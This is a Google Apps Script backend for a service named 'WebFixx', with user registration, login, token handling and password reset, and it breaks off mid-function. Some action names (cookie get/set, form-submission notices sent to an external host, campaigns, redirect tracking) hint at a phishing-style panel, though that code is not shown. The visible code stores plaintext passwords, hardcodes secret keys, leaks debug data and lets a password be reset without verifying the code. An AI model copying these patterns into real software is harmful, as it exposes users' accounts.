// Main endpoint handler
const SCRIPT_KEY = '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234';

const CONFIG = {
  NAME: "WebFixx",
  DB_ID: "17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U",
  SHEET_NAME: {
    PROJECTS: "projects",
    HUB: "hub",
    SETTINGS: "settings",
    COOKIE: "cookie", // Added COOKIE sheet name
    CAMPAIGNS: "campaigns",
    LINKS: "links",
  },
  FOLDER_ID: {
    USERS: "1EpxeonSw7wrvzSjiqRPKkIFRUHoZR_Pp",
    PROFILE_PICTURE: "1TwKBloBke5GQav9h5knkO0lk7ezo-PR8",
    CAMPAIGNS: "1ndSyFTzxAiWrAknA_H5gutcJf-kejfeY",
  },
  CACHE_EXPIRED_IN_SECONDS: 21600, // 6 hours
  //EXTERNAL_API: "https://058b-105-119-23-209.ngrok-free.app"
  //EXTERNAL_API: "https://3ed4-102-88-54-126.ngrok-free.app"
  EXTERNAL_API: "https://webfixx-serverless-zvre9t-e955ff-157-173-204-24.sslip.io"
};


function validateRequest(params) {
  const providedKey = params.key || params.headers?.['X-Script-Key'];
  if (!providedKey || providedKey !== SCRIPT_KEY) {
    throw new Error('Unauthorized request');
  }
  return true;
}

function doPost(e) {
  const _postStart = Date.now();
  try {
    Logger.log("Received POST request");
    const params = e.parameter;
    const traceId = params.traceId || "n/a";
    Logger.log(`[api][${traceId}] action=${params.action || "?"} start=${_postStart}`);
    
    // Validate request
    try {
      validateRequest(params);
    } catch (error) {
      return createJsonResponse({ error: 'Unauthorized', status: 401 });
    }

    const action = params.action;
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const userSheet = ss.getSheetByName("user");

    if (!userSheet) {
      return createJsonResponse({ error: "Required database not found" });
    }

    // Remove security key from params before processing
    delete params.key;

    switch (action) {
      case "verifyRedirectVisit":
        return verifyRedirectVisit(params);
      case "verifyPageVisit":
        return verifyPageVisit(params);
      case "getCookieData":
        return getCookieData(params);
      case "setCookieData":
        return setCookieData(params);
      case "notifyFormSubmission":
        return notifyFormSubmission(params, CONFIG.EXTERNAL_API);
      case "updateProcess":
        return updateProcess(params);
      case "poolingOperator":
        return poolingOperator(params);
      case "login":
        return handleLogin(params);
      case "register":
        return handleRegister(params);
      case "resetPassword":
        return resetPassword(params);
      case "verifyResetCode":
        return verifyResetCode(params);
      case "updatePassword":
        return updatePassword(params);
      case "backendFunction":
        return handleBackendFunction(params);
      case "saveDebugPage":
        return saveDebugPage(params);
      case "setMultipleCellDataByColumnSearch":
        return handleSetMultipleCellData(params);
      default:
        return createJsonResponse({ error: "Invalid action" });
    }
  } catch (error) {
    Logger.log("Error in doPost: " + error.message);
    return createJsonResponse({ error: error.message });
  }
}

// Add this at the top of your file
const SECRET_KEY = "fd7c25e9b4a3f8d6c1e0b2a5984f3d2e1b7a9c4f0e8d2b5a3c6f9e1d4b7a0c8e5f2d9b6a3c0f7e4d1b8a5c2f9e6d3b0a7c4f1e8d5b2a9c6f3e0d7b4a1c8f5e2";

function generateSecureToken(userId, role) {
  const timestamp = new Date().getTime();
  const randomPart = Math.random().toString(36).substring(2);
  const dataToEncode = `${userId}|${role}|${timestamp}|${randomPart}`;
  
  // Create HMAC signature
  const signature = Utilities.computeHmacSha256Signature(
    dataToEncode,
    SECRET_KEY
  );
  const signatureHex = signature.map(byte => 
    ('0' + (byte & 0xFF).toString(16)).slice(-2)
  ).join('');
  
  // Combine data and signature
  const token = `${dataToEncode}.${signatureHex}`;
  return Utilities.base64Encode(token);
}


function createDetailedError(message, details = {}) {
  return {
    error: message,
    details: {
      ...details,
      timestamp: new Date().toISOString()
    }
  };
}

function verifyToken(token) {
  try {
    // Early validation
    if (!token) {
      Logger.log("No token provided");
      return {
        success: false,
        error: "No token provided"
      };
    }

    Logger.log("Starting token verification for token length: " + token.length);

    // Decode base64 token with more robust error handling
    let decoded;
    try {
      decoded = Utilities.base64Decode(token);
      if (!decoded || decoded.length === 0) {
        throw new Error("Base64 decoding resulted in empty data");
      }
      decoded = Utilities.newBlob(decoded).getDataAsString();
      Logger.log("Successfully decoded token: " + decoded.substring(0, 50) + "...");
    } catch (e) {
      Logger.log("Token decoding error: " + e.message);
      return {
        success: false,
        error: "Token decoding failed",
        debug: {
          message: e.message,
          tokenStart: token.substring(0, 20) + "..."
        }
      };
    }

    // Split token into data and signature
    const [data, receivedSignature] = decoded.split('.');
    if (!data || !receivedSignature) {
      Logger.log("Invalid token format");
      return {
        success: false,
        error: "Invalid token format",
        debug: { 
          decodedToken: decoded,
          dataLength: data ? data.length : 'undefined',
          signatureLength: receivedSignature ? receivedSignature.length : 'undefined'
        }
      };
    }

    // Parse token data
    const tokenParts = data.split('|');
    if (tokenParts.length !== 4) {
      Logger.log("Incorrect number of token parts: " + tokenParts.length);
      return {
        success: false,
        error: "Malformed token data",
        debug: { 
          tokenParts: tokenParts,
          expectedParts: 4
        }
      };
    }

    const [userId, role, timestamp, randomPart] = tokenParts;
    Logger.log("Token parts extracted: " + JSON.stringify({ userId, role, timestamp }));

    // Validate critical token parts
    if (!userId || !role) {
      Logger.log("Missing critical token information");
      return {
        success: false,
        error: "Incomplete token data",
        debug: { userId, role }
      };
    }

    // Get sheet and validate it exists
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      Logger.log("User sheet not found");
      return {
        success: false,
        error: "User sheet not found"
      };
    }

    // Get all data at once to minimize API calls
    const dataRange = userSheet.getDataRange();
    const values = dataRange.getValues();
    const headers = values[0];

    // Find column indices with more robust checking
    const requiredColumns = ["userId", "tokens", "role"];
    const columnIndices = requiredColumns.map(col => {
      const index = headers.indexOf(col);
      if (index === -1) {
        Logger.log("Missing column: " + col);
      }
      return index;
    });

    if (columnIndices.some(index => index === -1)) {
      return {
        success: false,
        error: "Required columns not found",
        debug: { 
          availableColumns: headers,
          requiredColumns: requiredColumns
        }
      };
    }

    const [userIdColIndex, tokensColIndex, roleColIndex] = columnIndices;

    // Find user row
    const userRowIndex = values.findIndex(row => row[userIdColIndex] === userId);
    if (userRowIndex === -1) {
      Logger.log("User not found for userId: " + userId);
      return {
        success: false,
        error: "User not found",
        debug: { 
          searchedUserId: userId,
          totalUsers: values.length - 1 // subtract header row
        }
      };
    }

    // Parse tokens with enhanced error handling
    let tokens;
    try {
      const tokensValue = values[userRowIndex][tokensColIndex];
      tokens = JSON.parse(tokensValue || "[]");
      
      if (!Array.isArray(tokens)) {
        throw new Error("Tokens is not an array");
      }
    } catch (e) {
      Logger.log("Token parsing error: " + e.message);
      return {
        success: false,
        error: "Failed to parse tokens",
        debug: {
          rawTokens: values[userRowIndex][tokensColIndex],
          parseError: e.message
        }
      };
    }

    // Validate token exists and not expired
    const tokenData = tokens.find(t => t.token === token);
    if (!tokenData) {
      Logger.log("Token not found in user tokens");
      return {
        success: false,
        error: "Token not found in user tokens",
        debug: { 
          userId, 
          tokenCount: tokens.length,
          tokenFragments: tokens.map(t => t.token.substring(0, 10))
        }
      };
    }

    // Check expiration
    const now = new Date();
    const expiresAt = new Date(tokenData.expiresAt);
    if (expiresAt < now) {
      Logger.log("Token expired");
      return {
        success: false,
        error: "Token expired",
        debug: {
          expiresAt: expiresAt.toISOString(),
          currentTime: now.toISOString()
        }
      };
    }

    // Update last used time
    tokenData.lastUsed = now.toISOString();
    
    // Update tokens in sheet
    try {
      const tokenCell = userSheet.getRange(userRowIndex + 1, tokensColIndex + 1);
      tokenCell.setValue(JSON.stringify(tokens));
    } catch (updateError) {
      Logger.log("Error updating token last used time: " + updateError.message);
      // Non-critical error, continue with verification
    }

    Logger.log("Token verification successful for userId: " + userId);
    return {
      success: true,
      userId: userId,
      role: role,
      decodedData: {
        userId: userId,
        role: role,
        timestamp: timestamp,
        randomPart: randomPart,
        fullToken: token,
        decodedToken: decoded,
        originalSignature: receivedSignature
      }
    };

  } catch (error) {
    Logger.log("Comprehensive verification error: " + error.toString());
    return {
      success: false,
      error: "Verification process failed",
      debug: {
        errorMessage: error.message,
        errorStack: error.stack,
        timestamp: new Date().toISOString()
      }
    };
  }
}

/**
 * Store token data in user's token column
 */
function storeUserToken(userId, tokenData) {
  try {
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const userRow = getRowsByColumn("user", "userId", userId);
    
    if (!userRow.success || userRow.count === 0) {
      throw new Error("User not found");
    }

    const headers = userRow.headers;
    const tokenColumnIndex = headers.indexOf("tokens");
    
    if (tokenColumnIndex === -1) {
      throw new Error("Tokens column not found");
    }

    // Get existing tokens
    let tokens = [];
    const existingTokens = userRow.data[0][tokenColumnIndex];
    if (existingTokens) {
      try {
        tokens = JSON.parse(existingTokens);
        // Clean expired tokens
        tokens = tokens.filter(t => new Date(t.expiresAt) > new Date());
      } catch (e) {
        tokens = [];
      }
    }

    // Add new token
    tokens.push({
      token: tokenData.token,
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
      deviceInfo: tokenData.deviceInfo || {},
      lastUsed: new Date()
    });

    // Update tokens in sheet
    const tokenCell = userSheet.getRange(userRow.rowIndex, tokenColumnIndex + 1);
    tokenCell.setValue(JSON.stringify(tokens));

    return { success: true };
  } catch (error) {
    Logger.log("Error storing token:", error);
    return { success: false, error: error.message };
  }
}

function testHandleRegister() {
  Logger.log("--- Starting testHandleRegister ---");

  // Test Case: Successful Registration
  const successParams = {
    email: `testuser_${Date.now()}@example.com`, // Unique email for each test run
    password: "Password123",
    username: `testuser${Date.now()}`,
    referralCode: "REF123"
  };
  let result = handleRegister(successParams);
  Logger.log("Registration Result: " + JSON.stringify(result, null, 2));

  if (result.success) {
    Logger.log("Successfully registered and logged in user.");
  } else {
    Logger.log("Registration failed: " + result.error);
  }

  Logger.log("--- Finished testHandleRegister ---");
}

function handleRegister(params) {
  const { email, password, username, referralCode } = params;

  try {
    // 1. Validate input data using the existing helper function
    const validationError = validateRegistrationData(email, password, username);
    if (validationError) {
      return createJsonResponse({ success: false, error: validationError });
    }

    // Get user sheet
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      throw new Error("User sheet not found");
    }
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const emailIndex = headers.indexOf("email");

    // 2. Check for existing email to prevent duplicate registrations
    const existingUser = getRowsByColumn("user", "email", email);
    if (existingUser.success && existingUser.count > 0) {
      return createJsonResponse({ success: false, error: "Email already registered" });
    }

    // Check if the email is a "destroyed" email
    if (email.startsWith("destroyed") && email.endsWith("@webfixx.com")) {
      return createJsonResponse({ success: false, error: "Cannot register with this email" });
    }

    // Create new user without userId first
    const newUser = {
      email: email,
      password: password, // Consider hashing password before storing
      username: username,
      createdAt: new Date().toISOString(),
      role: "USER",
      plan: "FREE",
      planExpiry: "",
      referredBy: referralCode || "",
      verifyStatus: "FALSE",
      darkMode: "FALSE",
      loginCount: "0",
      lastLogin: "",
      ipData: JSON.stringify(params.ipData || {}), // Store ipData
      deviceInfo: JSON.stringify(params.deviceInfo || {}), // Store deviceInfo
      twoFactorAuth: "FALSE", // Default 2FA to FALSE
      apiKey: "", // Default empty API key
      destroyAccount: "FALSE", // Default destroyAccount to FALSE
    };

    // Add user to sheet
    const result = setRowDataByHeaderMap("user", newUser);
    if (!result.success) {
      throw new Error(result.error || "Failed to create user record");
    }

    // Flush changes to the spreadsheet before attempting to read the new row
    SpreadsheetApp.flush();

    // Wait 2 seconds to ensure row is properly added and flushed
    Utilities.sleep(2000);

    // Get the user's row by email using the helper method
    const userRowResult = getRowsByColumn("user", "email", email);
    if (!userRowResult.success || userRowResult.count === 0) {
      throw new Error("Failed to retrieve user data after creation using getRowsByColumn");
    }

    const userFoundData = userRowResult.data[0]; // This is the 0-based array of the user's data
    const userFoundHeaders = userRowResult.headers; // Headers from getRowsByColumn

    // To get the 1-based row index for getRange, we need to re-fetch all rows and find the index
    const allSheetData = userSheet.getDataRange().getValues();
    const allSheetHeaders = allSheetData[0];

    const emailColIndexInFullSheet = allSheetHeaders.indexOf("email");

    if (emailColIndexInFullSheet === -1) {
      throw new Error("Email column not found in user sheet for index lookup");
    }

    // Find the 0-based index of the user's row in the full sheet data
    const userActualRowIndex0Based = allSheetData.findIndex((row, index) =>
      index > 0 && row[emailColIndexInFullSheet] === email
    );

    if (userActualRowIndex0Based === -1) {
      throw new Error("Failed to locate new user's row index in the sheet");
    }

    const userActualRowIndex1Based = userActualRowIndex0Based + 1; // Convert to 1-based for getRange

    // Get userId and role from the found row data (from the full sheet data)
    const userIdIndexInFullSheet = allSheetHeaders.indexOf("userId");
    if (userIdIndexInFullSheet === -1) {
      throw new Error("userId column not found in full sheet data");
    }
    const userId = allSheetData[userActualRowIndex0Based][userIdIndexInFullSheet];
    const role = allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("role")];

    // Create or get user's dedicated Drive folder
    const userFolderResult = getOrCreateUserFolder(userId, CONFIG.FOLDER_ID.USERS);
    if (!userFolderResult.success) {
      throw new Error(`Failed to create/get user folder: ${userFolderResult.error}`);
    }
    const userFolderId = userFolderResult.folderId;
    
    // Generate token
    const token = generateSecureToken(userId, role);

    // Create token data
    const tokenData = {
      token: token,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 days expiration
      deviceInfo: {}, // No device info on registration, can be added later
      lastUsed: new Date().toISOString()
    };

    // Handle tokens: Add new token to the user's row
    // Use allSheetHeaders to get the correct tokensIndex for the sheet
    const tokensIndex = allSheetHeaders.indexOf("tokens");
    let tokens = [];

    if (tokensIndex !== -1) {
      try {
        // Use the data from the actual row in the sheet for parsing tokens
        tokens = JSON.parse(allSheetData[userActualRowIndex0Based][tokensIndex] || "[]");
        tokens = tokens.filter(t => new Date(t.expiresAt) > new Date()); // Clean expired tokens
      } catch (e) {
        tokens = [];
      }
    } else {
      // Tokens column not found, assuming setRowDataByHeaderMap handles new columns.
    }

    tokens.push(tokenData);

    // Update tokens in sheet using the 1-based row index
    userSheet.getRange(userActualRowIndex1Based, tokensIndex + 1).setValue(JSON.stringify(tokens));

    // Get additional data based on role
    const allData = role === "ADMIN" ? getAdminData(userId) : getUserData(userId);

    // Format user response
    const userData = {
      id: userId,
      userId: userId,
      email: email,
      username: username,
      role: role,
      plan: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("plan")] || "FREE",
      verifyStatus: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("verifyStatus")] || "FALSE",
      balance: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("balance")] || "0.00",
      pendingBalance: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("pendingBalance")] || "0.00",
      btcAddress: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("btcAddress")] || "",
      ethAddress: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("ethAddress")] || "",
      usdtAddress: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("usdtAddress")] || "",
      darkMode: allSheetData[userActualRowIndex0Based][allSheetHeaders.indexOf("darkMode")] || "FALSE", // Ensure darkMode is included
      folderId: userFolderId // Include the user's folderId
    };

    // Send verification email after successful registration
    sendVerificationEmail({ userEmail: email });

    return createJsonResponse({
      success: true,
      token: token,
      user: userData,
      data: allData,
      needsVerification: userData.verifyStatus === "FALSE" || !userData.verifyStatus
    });

  } catch (error) {
    return createJsonResponse({
      success: false, // Explicitly set success to false for errors
      error: `Registration failed: ${error.message}`
    });
  }
}

function validateRegistrationData(email, password, username) {
  // Email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!email || !emailRegex.test(email)) {
    return "Invalid email format";
  }

  // Password validation
  if (!password || password.length < 6) {
    return "Password must be at least 6 characters";
  }
  
  if (!/[A-Z]/.test(password)) {
    return "Password must contain at least one uppercase letter";
  }
  
  if (!/[0-9]/.test(password)) {
    return "Password must contain at least one number";
  }

  // Username validation
  if (!username || username.length < 3) {
    return "Username must be at least 3 characters";
  }
  
  if (!/^[a-zA-Z][a-zA-Z0-9_]*$/.test(username)) {
    return "Username must start with a letter and contain only letters, numbers, and underscores";
  }

  return null;
}

function handleLogin(params) {
  const startTime = Date.now();
  try {
    const { email, password, ipData, deviceInfo } = params; // Added ipData

    // Input validation
    if (!email || !password) {
      return createJsonResponse({ error: "Email and password are required" });
    }

    // Get user data with row index
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const rows = userSheet.getDataRange().getValues();

    // Find user row
    const emailIndex = headers.indexOf("email");
    const userRowIndex = rows.findIndex((row, index) => index > 0 && row[emailIndex] === email);

    if (userRowIndex === -1) {
      return createJsonResponse({ error: "Invalid credentials" });
    }

    const user = rows[userRowIndex];
    const passwordIndex = headers.indexOf("password");
    const destroyAccountIndex = headers.indexOf("destroyAccount");
    const twoFactorAuthIndex = headers.indexOf("twoFactorAuth");
    const storedIpDataIndex = headers.indexOf("ipData");
    const storedDeviceInfoIndex = headers.indexOf("deviceInfo");
    const verifyStatusIndex = headers.indexOf("verifyStatus");
    const verifyCodeIndex = headers.indexOf("verifyCode");

    // Check if account is destroyed
    if (destroyAccountIndex !== -1 && user[destroyAccountIndex] === "TRUE") {
      return createJsonResponse({ success: false, error: "This account has been destroyed" });
    }

    // Verify password
    if (user[passwordIndex] !== password) {
      return createJsonResponse({ error: "Invalid credentials" });
    }

    const userId = user[headers.indexOf("userId")];
    const role = user[headers.indexOf("role")];

    // Ensure user has a dedicated Drive folder upon login
    const userFolderResult = getOrCreateUserFolder(userId, CONFIG.FOLDER_ID.USERS);
    if (!userFolderResult.success) {
      Logger.log(`Warning: Failed to create/get user folder during login for userId ${userId}: ${userFolderResult.error}`);
      // Continue login process, but log the error. The folderId might be missing in the response.
    }
    const userFolderId = userFolderResult.folderId;

    // Store current ipData and deviceInfo
    const updateFields = {
      ipData: JSON.stringify(ipData || {}),
      deviceInfo: JSON.stringify(deviceInfo || {}),
    };

    // 2FA Logic
    if (twoFactorAuthIndex !== -1 && user[twoFactorAuthIndex] === "TRUE") {
      const storedIpData = storedIpDataIndex !== -1 ? JSON.parse(user[storedIpDataIndex] || "{}") : {};
      const storedDeviceInfo = storedDeviceInfoIndex !== -1 ? JSON.parse(user[storedDeviceInfoIndex] || "{}") : {};

      const isIpDataMatch = JSON.stringify(ipData || {}) === JSON.stringify(storedIpData);
      const isDeviceInfoMatch = JSON.stringify(deviceInfo || {}) === JSON.stringify(storedDeviceInfo);

      if (!isIpDataMatch || !isDeviceInfoMatch) {
        // If device/IP doesn't match, set verifyStatus to FALSE and send verification email
        const newVerifyCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        updateFields.verifyStatus = "FALSE";
        updateFields.verifyCode = newVerifyCode;

        // Update user data in sheet immediately
        setMultipleCellDataByColumnSearch("user", "userId", userId, updateFields);

        // Send verification email
        sendVerificationEmail({ userEmail: email, verificationCode: newVerifyCode }); // Assuming sendVerificationEmail can take a code

        // Do not return here, continue with token generation and other steps
        // The needsVerification flag will be set in the final response
      }
    }

    // Update ipData and deviceInfo in the sheet
    // This will also update verifyStatus and verifyCode if 2FA mismatch occurred
    setMultipleCellDataByColumnSearch("user", "userId", userId, updateFields);

    // Generate token
    const token = generateSecureToken(userId, role);

    // Create token data
    const tokenData = {
      token: token,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      deviceInfo: deviceInfo || {},
      lastUsed: new Date().toISOString()
    };

    // Handle tokens
    const tokensIndex = headers.indexOf("tokens");
    let tokens = [];

    if (tokensIndex === -1) {
      // Add tokens column if it doesn't exist
      headers.push("tokens");
      userSheet.getRange(1, headers.length).setValue("tokens");
      tokensIndex = headers.length - 1;
    } else {
      try {
        tokens = JSON.parse(user[tokensIndex] || "[]");
        // Clean expired tokens
        tokens = tokens.filter(t => new Date(t.expiresAt) > new Date());
      } catch (e) {
        Logger.log("Error parsing tokens:", e);
      }
    }

    // Add new token
    tokens.push(tokenData);

    // Update tokens in sheet
    userSheet.getRange(userRowIndex + 1, tokensIndex + 1).setValue(JSON.stringify(tokens));

    // Get additional data
    const allData = role === "ADMIN" ? getAdminData(userId) : getUserData(userId);

    // Format user response
    const userData = {
      id: userId,
      userId: userId,
      email: user[emailIndex],
      username: user[headers.indexOf("username")],
      role: role,
      plan: user[headers.indexOf("plan")] || "FREE",
      planExpiry: user[headers.indexOf("planExpiry")] || "",
      verifyStatus: user[verifyStatusIndex] || "FALSE", // Use updated verifyStatus
      balance: user[headers.indexOf("balance")] || "0.00",
      pendingBalance: user[headers.indexOf("pendingBalance")] || "0.00",
      btcAddress: user[headers.indexOf("btcAddress")] || "",
      ethAddress: user[headers.indexOf("ethAddress")] || "",
      usdtAddress: user[headers.indexOf("usdtAddress")] || "",
      darkMode: user[headers.indexOf("darkMode")] || "FALSE",
      twoFactorAuth: user[twoFactorAuthIndex] || "FALSE", // Include 2FA status
      folderId: userFolderId // Include the user's folderId
    };

    Logger.log(`[handleLogin] completed in ${Date.now() - startTime}ms`);
    return createJsonResponse({
      success: true,
      token: token,
      user: userData,
      data: allData,
      needsVerification: userData.verifyStatus === "FALSE" || !userData.verifyStatus
    });

  } catch (error) {
    Logger.log(`[handleLogin] failed in ${Date.now() - startTime}ms: ${error.message}`);
    return createJsonResponse({ 
      success: false, 
      error: error.message || "Login failed" 
    });
  }
}

function resetPassword(params) {
  try {
    Logger.log("Starting password reset with params:", params);
    const { email } = params;
    
    if (!email) {
      return createJsonResponse({
        success: false,
        error: "Email is required"
      });
    }

    // Get user sheet and validate
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "User sheet not found"
      });
    }

    // Get data and validate columns
    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const tempCodeColIndex = headers.indexOf("tempCode");
    const usernameColIndex = headers.indexOf("username");

    if (emailColIndex === -1 || tempCodeColIndex === -1 || usernameColIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "Required columns not found",
        debug: { headers, required: ["email", "tempCode", "username"] }
      });
    }

    // Find user
    const userRowIndex = data.findIndex(row => row[emailColIndex] === email);
    if (userRowIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "No account found with this email"
      });
    }

    // Generate and save code
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    try {
      userSheet.getRange(userRowIndex + 1, tempCodeColIndex + 1).setValue(code);
    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Failed to save verification code",
        debug: { 
          rowIndex: userRowIndex + 1,
          colIndex: tempCodeColIndex + 1,
          error: e.message
        }
      });
    }

    // Send email
    try {
      const username = data[userRowIndex][usernameColIndex];
      GmailApp.sendEmail(
        email,
        "Reset Your WebFixx Password",
        `Your password reset code is: ${code}`,
        {
          name: "WebFixx Support",
          htmlBody: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
              <h2 style="color: #2563eb; margin-bottom: 20px;">Reset Your Password</h2>
              <p>Hi ${username},</p>
              <p>We received a request to reset your WebFixx account password.</p>
              <p>Your verification code is:</p>
              <div style="background-color: #f3f4f6; padding: 20px; text-align: center; font-size: 24px; letter-spacing: 5px; margin: 20px 0; border-radius: 8px;">
                ${code}
              </div>
              <p>This code will expire in 5 minutes.</p>
              <p style="color: #6b7280; font-size: 14px; margin-top: 30px;">
                If you didn't request this reset, please ignore this email or contact support.
              </p>
            </div>
          `
        }
      );

      return createJsonResponse({
        success: true,
        message: "Reset code sent successfully"
      });

    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Failed to send email",
        debug: { error: e.message }
      });
    }

  } catch (error) {
    Logger.log("Reset password error:", error);
    return createJsonResponse({
      success: false,
      error: "Password reset failed",
      debug: {
        errorMessage: error.message,
        stack: error.stack
      }
    });
  }
}

function verifyResetCode(params) {
  try {
    Logger.log("Verifying reset code with params:", params);
    const { email, code } = params;
    
    if (!email || !code) {
      return createJsonResponse({
        success: false,
        error: "Email and verification code are required"
      });
    }

    // Get user data
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "System error: User sheet not found"
      });
    }

    const data = userSheet.getDataRange().getDisplayValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const tempCodeColIndex = headers.indexOf("tempCode");

    if (emailColIndex === -1 || tempCodeColIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "System error: Required columns not found"
      });
    }

    // Find user
    const userRowIndex = data.findIndex(row => row[emailColIndex] === email);
    if (userRowIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "Invalid email or verification code"
      });
    }

    const storedCode = data[userRowIndex][tempCodeColIndex];
    
    if (!storedCode || code !== storedCode) {
      return createJsonResponse({
        success: false,
        error: "Invalid or expired verification code"
      });
    }

    return createJsonResponse({
      success: true,
      message: "Code verified successfully"
    });

  } catch (error) {
    Logger.log("Verification error:", error);
    return createJsonResponse({
      success: false,
      error: "Code verification failed"
    });
  }
}

function updatePassword(params) {
  try {
    Logger.log("Updating password with params:", params);
    const { email, newPassword } = params;
    
    if (!email || !newPassword) {
      return createJsonResponse({
        success: false,
        error: "Email and new password are required"
      });
    }

    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "System error: User sheet not found"
      });
    }

    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const passwordColIndex = headers.indexOf("password");

    if (emailColIndex === -1 || passwordColIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "System error: Required columns not found"
      });
    }

    const userRowIndex = data.findIndex(row => row[emailColIndex] === email);
    if (userRowIndex === -1) {
      return createJsonResponse({
        success: false,
        error: "User not found"
      });
    }

    try {
      userSheet.getRange(userRowIndex + 1, passwordColIndex + 1).setValue(newPassword);

      return createJsonResponse({
        success: true,
        message: "Password updated successfully"
      });

    } catch (e) {
      Logger.log("Error updating password:", e);
      return createJsonResponse({
        success: false,
        error: "Failed to update password"
      });
    }

  } catch (error) {
    Logger.log("Password update error:", error);
    return createJsonResponse({
      success: false,
      error: "Password update failed"
    });
  }
}

function changePassword(params) {
  try {
    Logger.log("Starting changePassword with params:", params);
    const { userId, oldPassword, newPassword } = params;

    if (!userId || !oldPassword || !newPassword) {
      return {
        success: false,
        error: "Missing required fields: userId, oldPassword, and newPassword are required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const headers = userResult.headers;
    const passwordIndex = headers.indexOf("password");

    if (passwordIndex === -1) {
      return {
        success: false,
        error: "System error: Password column not found"
      };
    }

    // Verify old password
    if (userRow[passwordIndex] !== oldPassword) {
      return {
        success: false,
        error: "Invalid old password."
      };
    }

    // Validate new password (re-using existing validation logic or adding new)
    // Assuming validateRegistrationData can be used for password strength check
    const validationError = validateRegistrationData(userRow[headers.indexOf("email")], newPassword, userRow[headers.indexOf("username")]);
    if (validationError) {
      return { success: false, error: validationError };
    }

    // Update password
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      password: newPassword
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to update password",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "Password changed successfully."
    };

  } catch (error) {
    Logger.log("Error in changePassword:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function generateApiKey(params) {
  try {
    Logger.log("Starting generateApiKey with params:", params);
    const { userId } = params;

    if (!userId) {
      return {
        success: false,
        error: "Missing required field: userId is required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    // Generate a new API key
    const newApiKey = Utilities.getUuid().replace(/-/g, ''); // Generate a UUID and remove hyphens

    // Update user's API key
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      apiKey: newApiKey
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to generate API Key.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "New API Key generated successfully.",
      data: {
        apiKey: newApiKey
      }
    };

  } catch (error) {
    Logger.log("Error in generateApiKey:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function changePlan(params) {
  try {
    Logger.log("Starting changePlan with params:", params);
    const { userId, newPlan } = params;

    if (!userId || !newPlan) {
      return {
        success: false,
        error: "Missing required fields: userId and newPlan are required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const userHeaders = userResult.headers;
    const currentPlan = userRow[userHeaders.indexOf("plan")];

    if (currentPlan === newPlan) {
      return {
        success: false,
        error: `User is already on plan: ${newPlan}`
      };
    }

    // Get plan details from 'limits' sheet, converting newPlan to uppercase for case-insensitive matching
    const limitsResult = getRowsByColumn("limits", "plan", newPlan.toUpperCase());
    if (!limitsResult.success || limitsResult.count === 0) {
      return {
        success: false,
        error: `Invalid plan: ${newPlan} not found in limits.`,
        details: {
